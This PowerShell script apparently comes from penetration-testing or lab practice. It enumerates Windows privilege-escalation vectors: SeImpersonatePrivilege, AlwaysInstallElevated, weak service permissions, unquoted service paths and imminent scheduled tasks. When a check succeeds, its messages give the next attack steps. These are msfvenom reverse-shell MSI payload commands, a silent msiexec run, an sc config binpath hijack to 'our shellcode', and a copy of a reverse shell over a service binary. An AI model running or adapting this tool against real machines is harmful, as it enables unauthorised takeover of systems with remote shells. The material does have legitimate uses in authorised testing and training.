
$ErrorActionPreference = "silentlycontinue"


write-host "Legend"
write-host "what vulnerability its checking"  -ForegroundColor green
write-host "if the vulnerability exists" -ForegroundColor Red -BackgroundColor Black
write-host "if the service is not vulnerable `n `n"  -ForegroundColor yellow



<#This block of code looks to see if seimpersonateprivilege is set, if it is then it could be vulnerble to JUICY POTATO or PRINTSPOOFER#>
write-host "checking for 'SeImpersonatePrivilege' `n"  -ForegroundColor green
$value = whoami /priv | findstr /B /C:"SeImpersonatePrivilege"
if ($value -eq'SeImpersonatePrivilege')
{
    write-host "possibly vulnerable to juicy potato `n" -ForegroundColor Red -BackgroundColor Black
}
else{
 write-host "Target is not vulnerable to juicy potato `n" -ForegroundColor yellow
}
<#This block of code looks to see if seimpersonateprivilege is set, if it is then it could be vulnerble to JUICY POTATO or PRINTSPOOFER#>





<#This block of code searches the registry for ALWAYSINSTALLELEVATED so we can install a msi shellcode file and execute it#>
write-host "checking for 'Always Intall Elevated Privesc vector' `n"  -ForegroundColor green
$value = reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | findstr "AlwaysInstallElevated    REG_DWORD    0x1" 
$value2 = reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | findstr "AlwaysInstallElevated    REG_DWORD    0x1" 
if (($value -match '0x1') -and ($value2 -match '0x1'))
{
    write-host "Target is exploitable via Always install elevated `n upload msi file and execute 'msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f msi > shell.msi `n or 'msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -a x86-f msi > shellx86.msi `n Then execute the payload with msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi `n" -ForegroundColor Red -BackgroundColor Black 
}
else{
write-host  "Target is not vulnerable via Always Install Elevated `n" -ForegroundColor yellow
}
<#This block of code searches the registry for ALWAYSINSTALLELEVATED so we can install a msi shellcode file and execute it#>




<#This block of code searches for SERVICE_CHANGE_CONFIG on services so we can modify the BINPATH to ridirect to our shellcode#>
write-host "Checking for insecure service permisssions" -ForegroundColor green

write-host "first checking with icacls for Modifiable flag" -ForegroundColor green

Get-WmiObject win32_service | Select-Object PathName | findstr "C:\\Program Files\\" | foreach-object{cmd.exe /c icacls $_} | select-string -pattern "'(M)'"

write-Host "`n now more through with accesschk `n" -ForegroundColor green

$i =  get-service

foreach ($name in $i)
{c:\users\user\Desktop\accesschk.exe /accepteula -uwcqv $env:USERNAME  $name | select-string -pattern 'SERVICE_CHANGE_CONFIG' -Context 3,0 | findstr /v "QUERY"}

if($name -ne $null)
{
write-host "service_change_config is enabled on a service try changing the services binpath to our shellcode `n sc config servicename binpath= ""\""C:\Users\currentuser\Desktop\shell.exe\""""""" -ForegroundColor Red -BackgroundColor Black} 
else{write-host "NOT VULNERABLE `n `n" -ForegroundColor Yellow} 
<#This block of code searches for SERVICE_CHANGE_CONFIG on services so we can modify the BINPATH to redirect to our shellcode#>



<#This block of code searches for service all access on services so we can modify the executable#>
write-host "checking for modifiable executable services with accesschk `n" -ForegroundColor green
write-host "note (check for writable BINARY_PATH_NAME BY EVERYONE if applicable create a reverse shell and copy over the executable service) `n" -ForegroundColor green
write-host "copy C:\Users\$env:username\reverse.exe " "c:\binary path" "/Y `n" -ForegroundColor green
$z = get-service
foreach ($val in $z)
{C:\users\user\Desktop\accesschk.exe /accepteula -ucqv $val  |  select-string -pattern Medium,Everyone,Users -context 2,0 | findstr /v NT | findstr /v SYSTEM | findstr /v Administrators  | findstr /v Medium  |findstr /v vds | findstr /v smphost | findstr /v RSoPProv | findstr /v RemoteAccess | findstr /v MapsBroker | findstr /v NetTcpPortSharing|findstr /v DsSvc | findstr /v DllsvC   | findstr /v "SERVICE_QUERY_STATUS"  | findstr /v "SERVICE_INTERROGATE" | findstr /v "SERVICE_ENUMERATE_DEPENDENTS" | findstr /v "SERVICE_START" | findstr /v "READ_CONTROL" | findstr /v "SERVICE_PAUSE_CONTINUE" | findstr /v "SERVICE_STOP" | findstr /v "SERVICE_USER_DEFINED_CONTROL" |  findstr /v "WRITE_DAC" | findstr /v "OWNER" | findstr /V SERVICE_QUERY_CONFIG  | select-String -pattern SERVICE_ALL_ACCESS -context 1,1 >>  "C:\Users\$env:Username\Desktop\services.ps1"}

Get-Content "C:\Users\$env:username\Desktop\services.ps1" | select-string -pattern "Everyone","SERVICE_ALL_ACCESS","Users","dllsvc","dllhijackingservice.exe","RasAuto","Schedule",'^\s*$' -NotMatch >> "C:\Users\$env:Username\Desktop\serv.ps1"
Get-Content "C:\Users\$env:Username\Desktop\serv.ps1" |  foreach-object {$_.Trim()}|ForEach-Object{cmd.exe /c sc.exe qc $_} | select-string -pattern "SERVICE_NAME","START_TYPE","BINARY_PATH_NAME","SERVICE_START_NAME"
<#This block of code searches for service all access on services so we can modify the executable#>




<#This block of code searches for Unquoted service paths#>
write-host "Checking for unquoted Service Paths `n" -ForegroundColor green
wmic service get pathname | findstr "C:\\Program Files\\" | select-string """" -NotMatch | findstr /v 'LiteAgent'
<#This block of code searches for Unquoted Service Paths#>




<#This block of code searches for schedualed tasks that run every 1 - 5 minutes which may be vulnerable --> similar to cron jobs#>
write-host "checking for schedualed tasks in the next minute" -ForegroundColor green
$Minutes = 1
$Time = (Get-Date).AddMinutes(+$Minutes) | Get-Date -Format "h:mm"
$x= schtasks.exe /query /fo LIST /v   | findstr /v "N/A" | findstr /v '\Microsoft' |findstr /v /i 'System32' | findstr /v 'Defender' | findstr /v 'OneDrive' | select-string -pattern 'TaskName','Next','C:' -context 1,0 | findstr /v 'WS02' | findstr /v 'Tasks'| select-string  $Time -context 0,2
$x

write-host "checking for schedualed tasks in the next 2 minutes" -ForegroundColor green
$Minutes = 2
$Time = (Get-Date).AddMinutes(+$Minutes) | Get-Date -Format "h:mm"
$x= schtasks.exe /query /fo LIST /v   | findstr /v "N/A" | findstr /v '\Microsoft' |findstr /v /i 'System32' | findstr /v 'Defender' | findstr /v 'OneDrive' | select-string -pattern 'TaskName','Next','C:' -context 1,0 | findstr /v 'WS02' | findstr /v 'Tasks'| select-string  $Time -context 0,2
$x

write-host "checking for schedualed tasks in the next 3 minutes" -ForegroundColor green
$Minutes = 3
$Time = (Get-Date).AddMinutes(+$Minutes) | Get-Date -Format "h:mm"
$x= schtasks.exe /query /fo LIST /v   | findstr /v "N/A" | findstr /v '\Microsoft' |findstr /v /i 'System32' | findstr /v 'Defender' | findstr /v 'OneDrive' | select-string -pattern 'TaskName','Next','C:' -context 1,0 | findstr /v 'WS02' | findstr /v 'Tasks'| select-string  $Time -context 0,2
$x

write-host "checking for schedualed tasks in the next 4 minutes" -ForegroundColor green
$Minutes = 4
$Time = (Get-Date).AddMinutes(+$Minutes) | Get-Date -Format "h:mm"
$x= schtasks.exe /query /fo LIST /v   | findstr /v "N/A" | findstr /v '\Microsoft' |findstr /v /i 'System32' | findstr /v 'Defender' | findstr /v 'OneDrive' | select-string -pattern 'TaskName','Next','C:' -context 1,0 | findstr /v 'WS02' | findstr /v 'Tasks'| select-string  $Time -context 0,2
$x

write-host "checking for schedualed tasks in the next 5 minutes" -ForegroundColor green
$Minutes = 5
$Time = (Get-Date).AddMinutes(+$Minutes) | Get-Date -Format "h:mm"
$x= schtasks.exe /query /fo LIST /v   | findstr /v "N/A" | findstr /v '\Microsoft' |findstr /v /i 'System32' | findstr /v 'Defender' | findstr /v 'OneDrive' | select-string -pattern 'TaskName','Next','C:' -context 1,0 | findstr /v 'WS02' | findstr /v 'Tasks'| select-string  $Time -context 0,2
$x
<#This block of code searches for schedualed tasks that run every 1 - 5 minutes which may be vulnerable --> similar to cron jobs#>
